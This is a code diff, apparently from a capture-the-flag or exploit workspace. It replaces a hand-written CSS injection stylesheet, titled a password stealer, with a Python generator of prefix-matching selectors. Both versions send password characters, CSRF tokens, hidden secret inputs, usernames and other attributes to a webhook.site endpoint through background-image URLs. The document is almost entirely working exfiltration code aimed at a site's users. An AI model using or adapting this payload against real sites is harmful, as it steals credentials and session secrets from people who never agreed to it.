@@ -1,62 +1,21 @@
-/* ===== PASSWORD STEALER ===== */
-/* Real-time password character exfiltration */
-input[name="password"][value^="a"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?type=password&pos=1&char=a"); }
-input[name="password"][value^="b"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?type=password&pos=1&char=b"); }
-/* [Include all 62 alphanumeric chars + specials] */
-input[name="password"][value^="A"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?type=password&pos=1&char=A"); }
-input[name="password"][value^="0"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?type=password&pos=1&char=0"); }
-input[name="password"][value^="!"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?type=password&pos=1&char=!"); }
-
-/* Subsequent characters (example after first char 'A') */
-input[name="password"][value^="Aa"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?type=password&pos=2&char=a"); }
-input[name="password"][value^="Ab"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?type=password&pos=2&char=b"); }
-/* [Repeat pattern for all combinations] */
-
-/* ===== META TAG DETECTION ===== */
-meta[name="csrf-token"],
-meta[name="authenticity-token"],
-meta[name="token"],
-meta[name="secret"],
-meta[name="flag"] {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?type=meta&name=attr(name)");
+chars = 'abcdefghijklmnopqrstuvwxyz0123456789-_'
+attributes = {
+    'class': '*',
+    'href': 'a',
+    'type': 'input',
+    'name': 'input'
 }
+prefix_len = 3
+webhook = 'https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d'
 
-/* ===== HIDDEN INPUT SCANNING ===== */
-input[type="hidden"][name*="token"],
-input[type="hidden"][name*="secret"],
-input[type="hidden"][name*="auth"] {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?type=hidden_input&name=attr(name)");
-}
+def gen(prefix, length, attr, el):
+    if len(prefix) == length:
+        selector = f'{el}[{attr}^="{prefix}"]'
+        url = f'{webhook}/?{attr}_pos{length}={prefix}'
+        print(f'{selector} {{ background-image: url("{url}"); }}')
+        return
+    for c in chars:
+        gen(prefix + c, length, attr, el)
 
-/* ===== COOKIE DETECTION ===== */
-meta[name="cookie"],
-input[name="cookie"],
-div[id*="cookie"],
-span[class*="cookie"] {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?type=cookie_element");
-}
-
-/* ===== ADMIN-SPECIFIC ELEMENTS ===== */
-input[name="admin"],
-div[id*="admin"],
-meta[name="admin"] {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?type=admin_element");
-}
-
-/* ===== SENSITIVE ATTRIBUTES ===== */
-[data-secret],
-[data-token],
-[data-auth] {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?type=data_attr&name=attr(data-*)");
-}
-
-/* ===== USERNAME STEALING ===== */
-input[name="username"][value] {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?type=username&val=attr(value)");
-}
-
-/* ===== REPORT BUTTON DETECTION ===== */
-input[name="report"],
-input[name="report-button"] {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?type=report_button");
-}
+for attr, el in attributes.items():
+    gen('', prefix_len, attr, el)
